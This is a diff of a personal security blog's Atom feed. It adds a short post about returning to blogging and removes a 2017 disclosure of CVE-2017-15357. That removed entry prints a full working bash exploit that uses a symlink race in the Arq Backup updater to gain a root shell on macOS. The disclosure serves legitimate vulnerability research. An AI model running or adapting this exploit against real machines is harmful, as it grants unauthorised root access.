@@ -6,7 +6,25 @@
   </author>
   <id>http://m4.rkw.io/blog/</id>
   <title>m4.rkw.io</title>
-  <updated>2021-07-09T00:24:50+01:00</updated>
+  <updated>2022-02-10T06:24:52+00:00</updated>
+  <entry>
+    <id>http://m4.rkw.io/blog/getting-back-into-blogging.html</id>
+    <link href="http://m4.rkw.io/blog/getting-back-into-blogging.html"/>
+    <summary>&lt;pre&gt;It&amp;#39;s been a while since I&amp;#39;ve blogged so I thought I&amp;#39;d get back into it with some
+security stuff. My dayjob has had a very heavy security focus for the last 3
+years and it&amp;#39;s infected my personal life too such that I&amp;#39;m now even more
+obsessed with security than I was before.
+
+I recently wrote a first draft of a Linux server hardening guide:
+&lt;a href=&quot;https://github.com/m4rkw/linux-server-hardening-guide and plan to start a&quot;&gt;https://github.com/m4rkw/linux-server-hardening-guide and plan to start a&lt;/a&gt;
+mini-series soon which will go into some of those topics in further detail with
+example configs etc.
+
+Watch this space!&lt;/pre&gt;</summary>
+    <title>Getting back into blogging</title>
+    <updated>2022-02-10T05:48:18+00:00</updated>
+    <dc:date>2022-02-10T05:48:18+00:00</dc:date>
+  </entry>
   <entry>
     <id>http://m4.rkw.io/blog/unlocking-ios-devices-with-a-yubikey.html</id>
     <link href="http://m4.rkw.io/blog/unlocking-ios-devices-with-a-yubikey.html"/>
@@ -2435,90 +2453,5 @@ puts &amp;quot;exploit failed&amp;quot;&lt;/pre&gt;</summary>
     <updated>2017-11-29T19:09:43+00:00</updated>
     <dc:date>2017-11-29T19:09:43+00:00</dc:date>
   </entry>
-  <entry>
-    <id>http://m4.rkw.io/blog/cve201715357-local-root-privesc-in-arq-backup--596.html</id>
-    <link href="http://m4.rkw.io/blog/cve201715357-local-root-privesc-in-arq-backup--596.html"/>
-    <summary>&lt;pre&gt;Arq Backup from Haystack Software is a great application for backing up macs and
-windows machines. Unfortunately versions of Arq for mac before 5.9.7 are
-vulnerable to a local root privilege escalation exploit.
-
-The updater binary has a &amp;quot;setpermissions&amp;quot; function which sets the suid bit and
-root ownership on itself but it suffers from a race condition that allows you to
-swap the destination for these privileges using a symlink.
-
-We can exploit this to get +s and root ownership on any arbitrary binary.
-
-Other binaries in the application also suffer from the same issue.
-
-This was fixed in Arq 5.9.7.
-
-&lt;a href=&quot;https://m4.rkw.io/arq_5.9.6.sh.txt&quot;&gt;https://m4.rkw.io/arq_5.9.6.sh.txt&lt;/a&gt;
-49cc82df33a3e23245c7a1659cc74c0e554d5fdbe2547ac14e838338e823956d
-------------------------------------------------------------------------------
-#!/bin/bash
-
-##################################################################
-###### Arq &amp;lt;= 5.9.6 local root privilege escalation exploit ######
-###### by m4rkw - &lt;a href=&quot;https://m4.rkw.io/blog.html&quot;&gt;https://m4.rkw.io/blog.html&lt;/a&gt;                 ####
-##################################################################
-
-vuln=`ls -la /Applications/Arq.app/Contents/Library/LoginItems/\
-Arq\ Agent.app/Contents/Resources/arq_updater |grep &amp;#39;rwsr-xr-x&amp;#39; \
-|grep root`
-
-cwd=&amp;quot;`pwd`&amp;quot;
-
-if [ &amp;quot;$vuln&amp;quot; == &amp;quot;&amp;quot; ] ; then
-  echo &amp;quot;Not vulnerable - auto-updates not enabled.&amp;quot;
-  exit 1
-fi
-
-cat &amp;gt; arq_596_exp.c &amp;lt;&amp;lt;EOF
-#include &amp;lt;unistd.h&amp;gt;
-int main()
-{
-  setuid(0);
-  seteuid(0);
-  execl(
-    &amp;quot;/bin/bash&amp;quot;,&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;rm -f $cwd/arq_updater;/bin/bash&amp;quot;,
-    NULL
-  );
-  return 0;
-}
-EOF
-
-gcc -o arq_596_exp arq_596_exp.c
-rm -f arq_596_exp.c
-
-ln -s /Applications/Arq.app/Contents/Library/LoginItems/\
-Arq\ Agent.app/Contents/Resources/arq_updater
-
-./arq_updater setpermissions &amp;amp;&amp;gt;/dev/null&amp;amp;
-rm -f ./arq_updater
-mv arq_596_exp ./arq_updater
-
-i=0
-timeout=10
-
-while :
-do
-  r=`ls -la ./arq_updater |grep root`
-  if [ &amp;quot;$r&amp;quot; != &amp;quot;&amp;quot; ] ; then
-    break
-  fi
-  sleep 0.1
-  i=$((i+1))
-  if [ $i -eq $timeout ] ; then
-    rm -f ./arq_updater
-    echo &amp;quot;Not vulnerable&amp;quot;
-    exit 1
-  fi
-done
-
-./arq_updater&lt;/pre&gt;</summary>
-    <title>CVE-2017-15357 Local root privesc in Arq Backup &lt;= 5.9.6</title>
-    <updated>2017-11-29T19:02:01+00:00</updated>
-    <dc:date>2017-11-29T19:02:01+00:00</dc:date>
-  </entry>
-  <dc:date>2021-07-09T00:24:50+01:00</dc:date>
+  <dc:date>2022-02-10T06:24:52+00:00</dc:date>
 </feed>
